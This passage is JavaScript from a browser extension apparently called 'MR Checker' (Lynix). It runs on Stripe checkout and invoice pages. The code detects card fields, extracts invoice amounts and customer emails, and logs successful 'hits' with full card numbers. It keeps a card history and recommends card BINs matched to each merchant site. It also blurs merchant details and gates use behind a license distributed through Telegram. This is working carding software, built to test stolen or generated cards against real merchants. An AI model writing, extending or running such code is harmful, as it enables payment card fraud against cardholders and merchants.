        color: #fff !important;
        border-color: #333 !important;
      }
      button[type="submit"],
      .SubmitButton,
      [class*="SubmitButton"],
      [data-testid="hosted-payment-submit-button"],
      .Button--primary {
        background-color: #f97316 !important;
        background: #f97316 !important;
        color: #ffffff !important;
      }
      a${EX}, .Link--primary { color: #f97316 !important; }
      img, svg, video, canvas, iframe { filter: none !important; }
    `
    document.head.appendChild(style)

    // Also set inline styles on body to be extra sure
    document.body.style.setProperty("background-color", "#000000", "important")
    document.body.style.setProperty("color", "#ffffff", "important")

    // Remove non-essential iframes (ads, tracking) but keep Stripe/captcha
    document.querySelectorAll("iframe").forEach((f) => {
      const src = f.src || ""
      const name = f.name || ""
      if (src.includes("stripe") || name.startsWith("__privateStripe") ||
        src.includes("captcha") || src.includes("challenge") ||
        src.includes("3ds") || src.includes("hcaptcha") ||
        src.includes("recaptcha")) return
      // Don't remove, just skip
    })
  }

  // ============= PRIVACY BLUR =============
  function applyPrivacyBlur() {
    if (document.getElementById("lx-privacy-blur")) return
    const style = document.createElement("style")
    style.id = "lx-privacy-blur"
    style.textContent = `
      /* Blur product/merchant/site details */
      .App-header,
      .Link--primary,
      .ProductSummary-name,
      .ProductSummary-subscriptionDescription,
      .ProductSummary-amountsDescriptions,
      .LineItem-imageContainer,
      .LineItem-productName,
      .LineItem-description,
      .FadeWrapper,
      .OrderDetailsFooter-subtotalItems,
      [class*="Subtotal"],
      [class*="OrderDetailsSubtotalItem"],
      [class*="BusinessLink"],
      [class*="BusinessLink-backLabel"],
      [class*="MerchantHeader"],
      [class*="MerchantLogo"],
      [class*="site-name"],
      [class*="backLabel"],
      [class*="ProductSummary-name"],
      [class*="ProductSummary-subscriptionDescription"],
      [class*="ProductSummary-amountsDescriptions"],
      [class*="LineItem-image"],
      [class*="LineItem-productName"],
      [class*="LineItem-description"],
      [class*="FadeWrapper"],
      [class*="ImageContainer"],
      [class*="Header-business"],
      [class*="Header-merchant"],
      [class*="Header-returnLink"],
      [class*="PrivateStripe"],
      .ReadOnlyFormField-title,
      .ReadOnlyFormField-email .ReadOnlyFormField-title,
      [class*="TermsText"],
      [class*="LinkBrandDisclosure"],
      [class*="SavedStateSection-terms"],
      [class*="ManageLink"],
      [class*="disclosure"] {
        filter: blur(6px) !important;
        opacity: 0.5 !important;
        pointer-events: none !important;
        user-select: none !important;
        transition: all 0.3s ease !important;
      }

      /* Also blur the email field specifically */
      .ReadOnlyFormField-email,
      [class*="ReadOnlyFormField-email"],
      [class*="email"] .ReadOnlyFormField-title,
      input[type="email"],
      input#email {
        filter: blur(5px) !important;
        cursor: pointer !important;
      }

      /* Keep money/payment amounts fully visible */
      #OrderDetails-TotalAmount,
      #ProductSummary-totalAmount,
      .OrderDetails-total,
      .CurrencyAmount,
      [class*="TotalAmount"],
      [class*="total-amount"],
      [class*="CurrencyAmount"],
      [class*="OrderDetails-total"],
      .SubmitButton,
      [class*="SubmitButton"],
      button[type="submit"],
      input[type="text"],
      input[type="tel"],
      input#cardNumber,
      input#cardExpiry,
      input#cardCvc,
      input#billingName,
      input#billingPostalCode,
      input#billingAddressLine1,
      input#billingLocality,
      select {
        filter: none !important;
        opacity: 1 !important;
        pointer-events: auto !important;
        user-select: auto !important;
      }
    `
    document.head.appendChild(style)
  }

  function removePrivacyBlur() {
    const el = document.getElementById("lx-privacy-blur")
    if (el) el.remove()
  }

  // Apply dark mode unless user disabled it, check blur setting
  function initDarkAndPrivacy() {
    // Check if user disabled dark theme
    LynixStorage.get('lynix_disable_dark_theme').then((d) => {
      if (d && d.lynix_disable_dark_theme) {
        // User disabled dark theme — skip dark mode entirely
        return;
      }
      applyCheckoutDarkMode()
      darkModeObserver = new MutationObserver(() => applyCheckoutDarkMode())
      darkModeObserver.observe(document.body, { childList: true, subtree: true })
    });

    // Check blur setting via storage bridge (page context safe)
    LynixStorage.get('lynix_privacy_blur').then((d) => {
      if (d && d.lynix_privacy_blur) {
        applyPrivacyBlur()
      }
    })
  }

  let lastCaptchaState = false;
  setInterval(() => {
    if (!isDashboardActive) return;

    const currentCaptchaVisible = checkCaptchaVisible();

    if (currentCaptchaVisible !== lastCaptchaState) {
      lastCaptchaState = currentCaptchaVisible;
      isCaptchaVisible = currentCaptchaVisible;

      if (currentCaptchaVisible) {

        if (typeof autoHideDashboardForCaptcha === 'function') {
          autoHideDashboardForCaptcha();
        }
      } else {

        if (typeof restoreDashboardAfterCaptcha === 'function') {
          restoreDashboardAfterCaptcha();
        }
      }
    }

    if (!bgColorEnabled) return;
    if (isCaptchaVisible) {
      return;
    }
    const expectedBg = pageBackgroundColor || DEFAULT_BG_COLOR;
    const bodyBg = window.getComputedStyle(document.body).backgroundColor;
    const htmlBg = window.getComputedStyle(document.documentElement).backgroundColor;
    if (bodyBg === 'rgba(0, 0, 0, 0)' || bodyBg === 'transparent' ||
      htmlBg === 'rgba(0, 0, 0, 0)' || htmlBg === 'transparent' ||
      bodyBg.includes('255, 255, 255') || htmlBg.includes('255, 255, 255')) {
      applyCustomStyles();
    }
  }, 300);
  let styleTimeout = null;
  let isApplyingStyles = false;
  function debouncedApplyStyles() {
    if (!isDashboardActive) return;
    if (!bgColorEnabled) return;
    if (isApplyingStyles) return;
    if (isCaptchaVisible) return;
    if (styleTimeout) clearTimeout(styleTimeout);
    styleTimeout = setTimeout(() => {
      if (!isDashboardActive) return;
      if (checkCaptchaVisible()) {
        isCaptchaVisible = true;
        return;
      }
      isApplyingStyles = true;
      applyCustomStyles();
      isApplyingStyles = false;
    }, 50);
  }
  const styleObserver = new MutationObserver((mutations) => {
    const captchaAdded = mutations.some(m => {
      return Array.from(m.addedNodes).some(node => {
        if (node.nodeType === 1) {
          return node.matches && (
            node.matches('[class*="hcaptcha"]') ||
            node.matches('[id*="hcaptcha"]') ||
            node.matches('[data-hcaptcha]') ||
            node.matches('iframe[src*="hcaptcha"]') ||
            node.matches('iframe[src*="captcha"]') ||
            node.matches('[class*="captcha"]') ||
            node.matches('[class*="challenge"]') ||
            node.matches('[class*="Challenge"]') ||
            node.matches('iframe[title*="captcha" i]') ||
            node.matches('iframe[title*="challenge" i]')
          );
        }
        return false;
      });
    });
    if (captchaAdded) {
      isCaptchaVisible = true;

      if (typeof autoHideDashboardForCaptcha === 'function') {
        autoHideDashboardForCaptcha();
      }
      return;
    }
    const captchaRemoved = mutations.some(m => {
      return Array.from(m.removedNodes).some(node => {
        if (node.nodeType === 1) {
          return node.matches && (
            node.matches('[class*="hcaptcha"]') ||
            node.matches('[id*="hcaptcha"]') ||
            node.matches('[data-hcaptcha]') ||
            node.matches('iframe[src*="hcaptcha"]') ||
            node.matches('iframe[src*="captcha"]') ||
            node.matches('[class*="captcha"]') ||
            node.matches('[class*="challenge"]') ||
            node.matches('[class*="Challenge"]') ||
            node.matches('[role="dialog"]')
          );
        }
        return false;
      });
    });
    if (captchaRemoved) {
      setTimeout(() => {
        isCaptchaVisible = checkCaptchaVisible();
        if (!isCaptchaVisible) {
          isRestoringAfterCaptcha = true;
          applyCustomStyles();

          if (typeof restoreDashboardAfterCaptcha === 'function') {
            restoreDashboardAfterCaptcha();
          }
          setTimeout(() => {
            isRestoringAfterCaptcha = false;
          }, 400);
        }
      }, 500);
      return;
    }
    const hasRelevantChanges = mutations.some(m =>
      m.type === 'childList' && m.addedNodes.length > 0
    );
    if (hasRelevantChanges && !isCaptchaVisible) {
      debouncedApplyStyles();
    }
  });
  styleObserver.observe(document.body, { childList: true, subtree: true });
  const CARD_FIELD_SELECTORS = [
    '#cardNumber',
    '[name="cardNumber"]',
    '[name="card-number"]',
    '[name="cardnumber"]',
    '[autocomplete="cc-number"]',
    '[data-elements-stable-field-name="cardNumber"]',
    'input[placeholder*="card number" i]',
    'input[placeholder*="card no" i]',
    'input[aria-label*="card number" i]',
    '#card-number',
    '.card-number',
    '[name="number"]',
    '[name="ccnumber"]',
    '[name="cc-number"]',
    '[data-stripe="number"]',
    'input[name*="cardNumber" i]',
    'input[name*="card_number" i]',
    'input[name*="creditcard" i]',
    'input[id*="cardNumber" i]',
    'input[id*="card-number" i]',
    'input[id*="cc-number" i]'
  ];
  const SUBMIT_BUTTON_SELECTORS = [
    '.SubmitButton',
    '[class*="SubmitButton"]',
    '.SubmitButton-IconContainer',
    '.Button--primary',
    'button[type="submit"]',
    '[data-testid="hosted-payment-submit-button"]',
    '.pay-button',
    '.payment-button',
    'button[class*="pay" i]',
    'button[class*="submit" i]'
  ];
  function hasCardFields() {
    for (const selector of CARD_FIELD_SELECTORS) {
      try {
        const element = document.querySelector(selector);
        if (element) return true;
      } catch (e) { }
    }
    const iframes = document.querySelectorAll('iframe');
    for (const iframe of iframes) {
      try {
        const src = iframe.src || '';
        const name = iframe.name || '';
        const id = iframe.id || '';
        if (src.includes('stripe') || name.includes('card') || id.includes('card') ||
          src.includes('checkout') || src.includes('payment')) {
          return true;
        }
      } catch (e) { }
    }
    return false;
  }
  function hasSubmitButton() {
    for (const selector of SUBMIT_BUTTON_SELECTORS) {
      try {
        const element = document.querySelector(selector);
        if (element) return true;
      } catch (e) { }
    }
    return false;
  }
  function hasStripeSessionInUrl() {
    const url = window.location.href;
    const hostname = window.location.hostname.toLowerCase();
    const pathname = window.location.pathname.toLowerCase();

    const isStripeDomain = hostname.includes('stripe.com') ||
      hostname.includes('checkout.') ||
      hostname.includes('pay.') ||
      hostname.includes('billing.') ||
      hostname.includes('invoice.') ||
      hostname.includes('buy.');

    if (!isStripeDomain) {
      return false;
    }

    if (url.includes('cs_live_') || url.includes('cs_test_')) return true;
    if (pathname.includes('/checkout/session/')) return true;
    if (pathname.includes('/checkout') && isStripeDomain) return true;
    if (url.includes('checkout.stripe.com/c/pay')) return true;
    if (hostname === 'buy.stripe.com') return true;

    return false;
  }
  function hasValidStripeKeys() {
    const csLive = extractCsLive(window.location.href);
    const pkLive = extractPkLive();
    return !!(csLive && pkLive);
  }
  function isInvoiceStripePage() {
    const url = window.location.href;
    return url.includes('invoice.stripe.com') || url.includes('/invoice/');
  }

  let invoiceData = null;

  function extractInvoiceData() {
    if (invoiceData) return invoiceData;

    try {
      const scripts = document.querySelectorAll('script');
      for (const script of scripts) {
        const content = script.textContent || '';

        if (content.includes('"object":"invoice"') || content.includes('"amount_due"')) {
          const jsonMatch = content.match(/\{[\s\S]*"object"\s*:\s*"invoice"[\s\S]*\}/);
          if (jsonMatch) {
            try {
              const data = JSON.parse(jsonMatch[0]);
              if (data.object === 'invoice') {
                invoiceData = {
                  amount: data.amount_due || data.total || 0,
                  currency: data.currency || 'usd',
                  email: data.customer_email || data.customer?.email || '',
                  productName: '',
                  businessUrl: '',
                  voided: data.voided === true
                };

                if (data.lines?.data?.[0]) {
                  const lineItem = data.lines.data[0];
                  invoiceData.productName = lineItem.hosted_invoice_product_name || lineItem.description || '';
                }

                if (data.business_url) {
                  invoiceData.businessUrl = data.business_url;
                }

                return invoiceData;
              }
            } catch (e) { }
          }
        }
      }

      if (window.__STRIPE_INVOICE__) {
        const data = window.__STRIPE_INVOICE__;
        invoiceData = {
          amount: data.amount_due || data.total || 0,
          currency: data.currency || 'usd',
          email: data.customer_email || '',
          productName: data.lines?.data?.[0]?.hosted_invoice_product_name || '',
          businessUrl: data.business_url || '',
          voided: data.voided === true
        };
        return invoiceData;
      }

      const pageText = document.body?.innerText || '';

      const emailMatch = pageText.match(/[\w.-]+@[\w.-]+\.\w+/);

      const amountMatch = pageText.match(/[₩$€£¥]\s*[\d,]+\.?\d*/);

      if (emailMatch || amountMatch) {
        invoiceData = {
          amount: amountMatch ? amountMatch[0] : '0',
          currency: '',
          email: emailMatch ? emailMatch[0] : '',
          productName: '',
          businessUrl: '',
          voided: false
        };
      }

    } catch (e) {
    }

    return invoiceData;
  }

  function isInvoiceVoided() {
    const data = extractInvoiceData();
    return data?.voided === true;
  }

  function getInvoiceDisplayName() {
    const data = extractInvoiceData();
    if (!data) return '';
    return data.businessUrl || data.productName || '';
  }

  function getInvoiceAmount() {
    const data = extractInvoiceData();
    if (!data) return '';

    const amount = data.amount;
    const currency = data.currency?.toUpperCase() || '';

    if (typeof amount === 'number') {
      const noDecimalCurrencies = ['KRW', 'JPY', 'VND'];
      if (noDecimalCurrencies.includes(currency)) {
        return `${amount.toLocaleString()} ${currency}`;
      }
      return `${(amount / 100).toFixed(2)} ${currency}`;
    }
    return amount || '0';
  }

  function getInvoiceEmail() {
    const data = extractInvoiceData();
    return data?.email || '';
  }

  function isBuyStripePage() {
    const hostname = window.location.hostname.toLowerCase();
    return hostname === 'buy.stripe.com' || hostname.endsWith('.buy.stripe.com');
  }

  function isPaymentPage() {

    if (isBuyStripePage()) {
      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      if (hasCards && hasSubmit) {
        return true;
      }

      if (document.querySelector('[class*="PaymentElement"], [class*="StripeElement"], [class*="CardElement"], [class*="CheckoutPaymentForm"], form[class*="Payment"]')) {
        return true;
      }

      if (document.querySelector('[class*="App"], [id="root"], [class*="Checkout"]')) {
        return true;
      }
      return false;
    }

    if (isInvoiceStripePage()) {
      if (isInvoiceVoided()) {
        return false;
      }

      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      const hasInvoiceElements = document.querySelector('[class*="InvoicePage"], [class*="invoice"], [id="root"]');
      if ((hasCards || hasSubmit) && hasInvoiceElements) {
        return true;
      }
      if (window.location.hostname === 'invoice.stripe.com') {
        return true;
      }
    }

    const hasCards = hasCardFields();
    if (!hasCards) return false;

    const hasSubmit = hasSubmitButton();
    if (!hasSubmit) return false;

    const hasSession = hasStripeSessionInUrl();
    if (!hasSession) return false;

    const hasKeys = hasValidStripeKeys();
    if (!hasKeys) return false;

    return true;
  }
  function waitForPaymentPage(callback, maxAttempts = 80) {
    let attempts = 0;
    const check = () => {
      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      const hasSession = hasStripeSessionInUrl();
      const hasKeys = hasValidStripeKeys();

      if (isBuyStripePage()) {
        if (hasCards && hasSubmit) {
          callback(true);
          return;
        }

        if (document.querySelector('[class*="PaymentElement"], [class*="StripeElement"], [class*="CardElement"], [class*="CheckoutPaymentForm"]')) {
          callback(true);
          return;
        }

        if (document.querySelector('[class*="App"], [id="root"], [class*="Checkout"]') && attempts >= 5) {
          callback(true);
          return;
        }
      }

      if (isInvoiceStripePage()) {
        extractInvoiceData();

        if (isInvoiceVoided()) {
          callback(false);
          return;
        }

        const hasInvoiceElements = document.querySelector('[class*="InvoicePage"], [class*="invoice"], [id="root"]');
        if (hasInvoiceElements || window.location.hostname === 'invoice.stripe.com') {
          if (hasCards && hasSubmit) {
            callback(true);
            return;
          }
        }
      }

      if (hasCards && hasSubmit && hasSession && hasKeys) {
        callback(true);
      } else if (attempts < maxAttempts) {
        attempts++;
        const delay = attempts < 10 ? 300 : attempts < 30 ? 200 : 250;
        setTimeout(check, delay);
      } else {
        // Last resort: if we're on a known Stripe domain, show overlay anyway
        const host = window.location.hostname.toLowerCase();
        if (host.includes('stripe.com') || host.includes('checkout') || host.includes('pay.')) {
          callback(true);
        } else {
          callback(false);
        }
      }
    };
    check();
  }

  const LICENSE_KEY = "MR Checker";
  const CURRENT_VERSION = "1.0.0";

  let telegramChannelLink = "https://t.me/shakib2016"
  let isCreatingOverlay = false
  let licenseChecked = false
  let licenseValid = false
  let latestVersion = ""
  let isVersionOutdated = false

  const pendingRequests = new Map()
  let requestId = 0

  function sendToBackground(message) {
    return new Promise((resolve) => {
      const id = ++requestId
      pendingRequests.set(id, resolve)

      window.postMessage({
        type: "LYNIX_TO_BACKGROUND",
        requestId: id,
        payload: message
      }, "*")

      setTimeout(() => {
        if (pendingRequests.has(id)) {
          pendingRequests.delete(id)
          resolve({ success: false, error: "Request timeout" })
        }
      }, 8000)
    })
  }

  window.addEventListener("message", (event) => {
    if (event.data && event.data.type === "LYNIX_FROM_BACKGROUND" && event.data.requestId) {
      const resolve = pendingRequests.get(event.data.requestId)
      if (resolve) {
        pendingRequests.delete(event.data.requestId)
        resolve(event.data.response || { success: false, error: "No response" })
      }
    }
  })

  async function handleAPIRequest(endpoint, payload = {}) {
    return await sendToBackground({ type: "API_REQUEST", endpoint, payload });
  }

  function compareVersions(v1, v2) {
    const parts1 = v1.replace(/^v/, '').split('.').map(Number);
    const parts2 = v2.replace(/^v/, '').split('.').map(Number);

    for (let i = 0; i < Math.max(parts1.length, parts2.length); i++) {
      const p1 = parts1[i] || 0;
      const p2 = parts2[i] || 0;
      if (p1 < p2) return -1;
      if (p1 > p2) return 1;
    }
    return 0;
  }

  async function checkLicenseKey(retryCount = 0) {
    const MAX_RETRIES = 3;

    if (licenseChecked && licenseValid) return licenseValid;

    if (!LICENSE_KEY) {
      licenseValid = false;
      licenseChecked = true;
      return false;
    }

    try {
      const result = await sendToBackground({
        type: "CHECK_LICENSE_KEY",
        key: LICENSE_KEY,
        version: CURRENT_VERSION
      });

      if (!result || result.error) {
        // Retry on error
        if (retryCount < MAX_RETRIES) {
          return checkLicenseKey(retryCount + 1);
        }
        // After max retries, assume valid to not block user
        licenseValid = true;
        licenseChecked = true;
        isVersionOutdated = false;
        return true;
      }

      if (result.valid === true) {
        licenseValid = true;
        licenseChecked = true;
        if (result.telegram_channel) {
          telegramChannelLink = result.telegram_channel;
        }
        if (result.latest_version && typeof result.latest_version === 'string') {
          latestVersion = result.latest_version.trim();
          const comparison = compareVersions(CURRENT_VERSION, latestVersion);
          isVersionOutdated = (comparison === -1);
        } else {
          isVersionOutdated = false;
        }
        return true;
      } else {
        // Retry if server says invalid (might be temporary issue)
        if (retryCount < MAX_RETRIES) {
          return checkLicenseKey(retryCount + 1);
        }
        licenseValid = false;
        licenseChecked = true;
        if (result.telegram_channel) {
          telegramChannelLink = result.telegram_channel;
        }
        return false;
      }
    } catch (e) {
      // Retry on exception
      if (retryCount < MAX_RETRIES) {
        return checkLicenseKey(retryCount + 1);
      }
      // After max retries, assume valid to not block user
      licenseValid = true;
      licenseChecked = true;
      isVersionOutdated = false;
      return true;
    }
  }

  function showUpdatePage(reason = "outdated") {
    const existingOverlay = document.querySelector(".card-generator-overlay");
    if (existingOverlay) existingOverlay.remove();
    const container = document.createElement("div");
    container.className = "card-generator-overlay";
    container.innerHTML = `
    <div class="panel-header">
      <div class="panel-header-content">
        <span class="panel-title">MR Checker</span>
      </div>
    </div>
    <div class="panel-body">
      <div id="updateScreen" class="update-screen">
        <div class="update-icon">${LX.refresh}</div>
        <h2 class="update-title">Update Required</h2>
        <p class="update-message">
          Your extension version is outdated.
          Please download the latest version to continue using MR Checker.
        </p>
        <div class="update-version">
          <span class="current-version">Current: v${CURRENT_VERSION}</span>
          ${latestVersion ? `<span class="latest-version">Latest: v${latestVersion}</span>` : ''}
        </div>
        <a href="${telegramChannelLink}" target="_blank" class="update-btn">
          ${LX.download} Download
        </a>
      </div>
    </div>
  `;
    document.body.appendChild(container);
  }

  function showInvalidLicensePage() {
    const existingOverlay = document.querySelector(".card-generator-overlay");
    if (existingOverlay) existingOverlay.remove();
    const container = document.createElement("div");
    container.className = "card-generator-overlay";
    container.innerHTML = `
    <div class="panel-header">
      <div class="panel-header-content">
        <span class="panel-title">MR Checker</span>
      </div>
    </div>
    <div class="panel-body">
      <div id="updateScreen" class="update-screen">
        <div class="update-icon">${LX.refresh}</div>
        <h2 class="update-title">Update Required</h2>
        <p class="update-message">
          Your extension version is outdated.
          Please download the latest version to continue using MR Checker.
        </p>
        <div class="update-version">
          <span class="current-version">Current: v${CURRENT_VERSION}</span>
        </div>
        <a href="${telegramChannelLink}" target="_blank" class="update-btn">
          ${LX.download} Download Update
        </a>
      </div>
    </div>
  `;
    document.body.appendChild(container);
  }

  const HIT_API_URL = "https://gold-newt-367030.hostingersite.com/api.php"

  let _hitCountsInterval = null;
  const HIT_COUNTS_REFRESH_MS = 30000; // refresh every 30 seconds

  // No backend — hit counts are read from chrome.storage.local by background
  async function fetchHitCounts() { /* local-only, handled by background */ }
  async function fetchGlobalHits() { /* removed */ }
  function startHitCountsRefresh() { /* removed */ }
  function stopHitCountsRefresh() { /* removed */ }

  let hasNotified = false
  let hasHit = false
  let darkModeObserver = null
  let isMinimized = false
  let isAutoSubmitting = false
  let attemptCount = 0
  let retryDelay = Math.floor(Math.random() * 500) + 500
  let cardHistory = []

  async function recordHit(token, hitData) {
    try {
      if (!hitData.fullCard || hitData.fullCard.length < 10) return;
      // Record hit to lynix_hit_history (background will also save BIN)
      sendToBackground({
        type: "RECORD_HIT",
        card: hitData.fullCard,
        amount: hitData.amount || '0',
        currency: hitData.currency || 'usd',
        merchant: hitData.merchant || window.location.hostname,
        email: extractedPaymentData.email || '',
        timeTaken: hitData.timeTaken || ''
      });
    } catch (e) { }
  }

  function loadCardHistory() {
    return new Promise((resolve) => {
      // Use proper storageRequest path via storage module
      if (window.LynixStorage && window.LynixStorage.loadAllData) {
        window.LynixStorage.loadAllData(function (data) {
          data = data || {};
          let logs = data[K.LOGS] || [];
          if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch (e) { logs = []; }
          let clearedAt = data[K.LOGS_CLEARED_AT] || null;
          if (clearedAt) {
            const clearedTime = new Date(clearedAt).getTime();
            logs = logs.filter(function (l) { return new Date(l.time || l.timestamp).getTime() > clearedTime; });
          }
          if (Array.isArray(logs)) {
            cardHistory = logs;
            localStorage.setItem(K.LOGS, JSON.stringify(logs));
          }
          if (clearedAt) localStorage.setItem(K.LOGS_CLEARED_AT, clearedAt);
          resolve();
        });
        setTimeout(resolve, 3000); // Timeout fallback
        return;
      }

      // Legacy fallback path (should not be reached)
      let gotLogs = false;
      let gotClearedAt = false;
      let logs = [];
      let clearedAt = null;

      const handler = (event) => {
        if (event.data && event.data.type === 'LYNIX_STORAGE_RESPONSE') {
          if (event.data.key === K.LOGS) {
            logs = event.data.value || [];
            if (typeof logs === 'string') {
              try { logs = JSON.parse(logs); } catch (e) { logs = []; }
            }
            gotLogs = true;
          }
          if (event.data.key === K.LOGS_CLEARED_AT) {
            clearedAt = event.data.value;
            gotClearedAt = true;
          }

          if (gotLogs && gotClearedAt) {
            window.removeEventListener('message', handler);
            if (clearedAt) {
              cardHistory = logs.filter(log => log.time && log.time > clearedAt);
            } else {
              cardHistory = logs;
            }
            resolve(cardHistory);
          }
        }
      };

      window.addEventListener('message', handler);

      setTimeout(() => {
        if (!gotLogs) {
          window.removeEventListener('message', handler);
          const localLogs = JSON.parse(localStorage.getItem(K.LOGS) || "[]");
          const localClearedAt = localStorage.getItem(K.LOGS_CLEARED_AT);
          cardHistory = localClearedAt ? localLogs.filter(log => log.time && log.time > localClearedAt) : localLogs;
          resolve(cardHistory);
        }
      }, 1000);
    });
  }

  function saveCardHistory() {
    const logsToSave = cardHistory.slice(0, 50);
    const data = {};
    data[K.LOGS] = logsToSave;
    window.postMessage({
      type: 'LYNIX_STORAGE_REQUEST',
      requestId: 'logs_' + Date.now(),
      action: 'SET',
      data: data
    }, '*');
    localStorage.setItem(K.LOGS, JSON.stringify(logsToSave));
  }

  loadCardHistory().then(() => {
    if (typeof updateHistoryDisplay === 'function') {
      updateHistoryDisplay();
    }
  });

  let currentMode = "bin"
  let ccList = []
  let currentCCIndex = 0
  let isLoggedIn = false
  let userId = ""
  let userFirstName = ""
  let userPfpUrl = ""
  let userHitsCount = 0
  let userAttemptsCount = 0
  let globalHitsCount = 0
  const DEFAULT_PFP = (() => {
    try {
      const meta = document.querySelector('meta[name="lynix-default-pfp"]');
      if (meta && meta.content) return meta.content;
    } catch (e) { }
    return "";
  })()
  let tgForwardEnabled = true
  let cardFieldsDetected = false
  const notiSoundEnabled = true
  let soundVolume = 1.0
  let customName = ""
  let customEmail = ""
  let customAddrStreet = ""
  let customAddrCity = ""
  let customAddrZip = ""
  let customAddrCountry = ""
  let globalStorageLoaded = false

  let binLibrary = [];

  async function fetchBinLibrary() {
    if (window.LynixBinLibrary) {
      const result = await window.LynixBinLibrary.fetchBinLibrary();

      binLibrary = window.LynixBinLibrary.bins || [];
      return result;
    }
    return false;
  }

  function renderBinLibraryGrid() {
    if (window.LynixBinLibrary) {

      binLibrary = window.LynixBinLibrary.bins || [];

      const restoreDashboard = () => {
        const overlay = document.querySelector(".card-generator-overlay");
        if (overlay && isMinimized) {
          isMinimized = false;
          overlay.classList.remove("minimized");
          const minimizeBtn = document.getElementById("minimizeBtn");
          if (minimizeBtn) {
            minimizeBtn.innerHTML = "»";
            minimizeBtn.title = "Close panel";
          }
        }
      };
      window.LynixBinLibrary.renderBinLibraryGrid(showWarning, restoreDashboard);
    }
  }

  let binRecommendationShown = false;

  function checkBinRecommendation(businessUrl) {
    if (!businessUrl || binRecommendationShown || !binLibrary || binLibrary.length === 0) return;

    const cleanUrl = (url) => {
      if (!url) return '';
      return url.toLowerCase()
        .replace(/^https?:\/\//, '')
        .replace(/^www\./, '')
        .replace(/\/$/, '')
        .split('/')[0];
    };

    const targetDomain = cleanUrl(businessUrl);
    if (!targetDomain) return;

    const matchingBins = binLibrary.filter(bin => {
      const binSite = cleanUrl(bin.site);
      return binSite === targetDomain ||
        binSite.includes(targetDomain) ||
        targetDomain.includes(binSite);
    });

    if (matchingBins.length > 0) {
      binRecommendationShown = true;
      showBinRecommendationPopup(businessUrl, matchingBins);
    }
  }

  function showBinRecommendationPopup(site, bins) {
    const existingPopup = document.getElementById('lynix-bin-recommend');
    if (existingPopup) existingPopup.remove();

    const popup = document.createElement('div');
    popup.id = 'lynix-bin-recommend';
    popup.className = 'bin-recommend-popup';

    const cleanSite = site.replace(/^https?:\/\//, '').replace(/^www\./, '').replace(/\/$/, '');

    let binsHtml = '';
    bins.forEach((bin, index) => {
      const binNumber = bin.bin || bin.BIN || '';
      const binCredit = bin.credit || 'N/A';
      binsHtml += `
        <div class="bin-recommend-item">
          <div class="bin-recommend-row">
            <span class="bin-recommend-label">Site:</span>
            <span class="bin-recommend-value">${cleanSite}</span>
          </div>
          <div class="bin-recommend-row">
            <span class="bin-recommend-label">Bin:</span>
            <span class="bin-recommend-value bin-number">${binNumber}</span>
            <button class="bin-recommend-copy-btn" data-bin="${binNumber}">Copy</button>
          </div>
          <div class="bin-recommend-row">
            <span class="bin-recommend-label">Credit:</span>
            <span class="bin-recommend-value">${binCredit}</span>
          </div>
        </div>
      `;
    });

    popup.innerHTML = `
      <div class="bin-recommend-header">
        <span>Bin Found</span>
        <div class="bin-recommend-countdown" id="binRecommendCountdown">10s</div>
      </div>
      <div class="bin-recommend-body">
        ${binsHtml}
      </div>
    `;

    document.body.appendChild(popup);

    popup.style.setProperty('background', 'rgba(255,255,255,0.78)', 'important');
    popup.style.setProperty('background-color', 'rgba(255,255,255,0.78)', 'important');
    popup.style.setProperty('background-image', 'none', 'important');
    popup.style.setProperty('backdrop-filter', 'blur(8px)', 'important');
    popup.style.setProperty('-webkit-backdrop-filter', 'blur(8px)', 'important');
    popup.style.setProperty('border', '1px solid rgba(255,255,255,0.45)', 'important');
    popup.style.setProperty('box-shadow', '0 8px 32px rgba(13,148,136,0.12), inset 0 1px 0 rgba(255,255,255,0.6)', 'important');

    const header = popup.querySelector('.bin-recommend-header');
    if (header) {
      header.style.setProperty('background', 'linear-gradient(135deg, rgba(13,148,136,0.85), rgba(15,118,110,0.9))', 'important');
      header.style.setProperty('border-bottom', '1px solid rgba(255,255,255,0.15)', 'important');
    }

    const body = popup.querySelector('.bin-recommend-body');
    if (body) {
      body.style.setProperty('background', 'rgba(248,253,252,0.5)', 'important');
      body.style.setProperty('background-color', 'rgba(248,253,252,0.5)', 'important');
    }

    setTimeout(() => popup.classList.add('show'), 50);

    let countdown = 10;
    const countdownEl = document.getElementById('binRecommendCountdown');
    const countdownInterval = setInterval(() => {
      countdown--;
      if (countdownEl) {
        countdownEl.textContent = countdown + 's';
      }
      if (countdown <= 0) {
        clearInterval(countdownInterval);
        popup.classList.remove('show');
        setTimeout(() => popup.remove(), 300);
      }
    }, 1000);

    const copyBtns = popup.querySelectorAll('.bin-recommend-copy-btn');
    copyBtns.forEach(btn => {
      btn.addEventListener('click', async (e) => {
        const binToCopy = btn.getAttribute('data-bin');
        try {
          await navigator.clipboard.writeText(binToCopy);
          btn.textContent = 'Copied!';
          showWarning(`BIN ${binToCopy} copied!`, 'success');
          setTimeout(() => btn.textContent = 'Copy', 2000);
        } catch (err) {
          const textarea = document.createElement('textarea');
          textarea.value = binToCopy;
          textarea.style.position = 'fixed';
          textarea.style.opacity = '0';
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
          btn.textContent = 'Copied!';
          showWarning(`BIN ${binToCopy} copied!`, 'success');
          setTimeout(() => btn.textContent = 'Copy', 2000);
        }
      });
    });
  }

  async function checkNewBinNotification() {
    try {
      const userId = localStorage.getItem(K.USER_ID);
      if (!userId) return false;

      const lastSeenBinTime = localStorage.getItem(K.LAST_SEEN_BIN_TIME);

      let bins = binLibrary || [];
      if (bins.length === 0 && window.LynixBinLibrary) {
        bins = window.LynixBinLibrary.bins || [];
      }
      if (bins.length === 0) return false;

      if (!lastSeenBinTime) {
        localStorage.setItem(K.LAST_SEEN_BIN_TIME, new Date().toISOString());
        return false;
      }

      const lastSeenDate = new Date(lastSeenBinTime);

      const newBins = bins.filter(bin => {
        if (!bin.added_at) return false;
        const binDate = new Date(bin.added_at);
        return binDate > lastSeenDate;
      });

      if (newBins.length > 0) {
        await showNewBinNotification(newBins.length);
        localStorage.setItem(K.LAST_SEEN_BIN_TIME, new Date().toISOString());
        return true;
      }
      return false;
    } catch (e) {
      return false;
    }
  }

  function showNewBinNotification(count) {
    return new Promise((resolve) => {

      const existing = document.getElementById('lynix-bin-notification');
      if (existing) existing.remove();

      const notification = document.createElement('div');
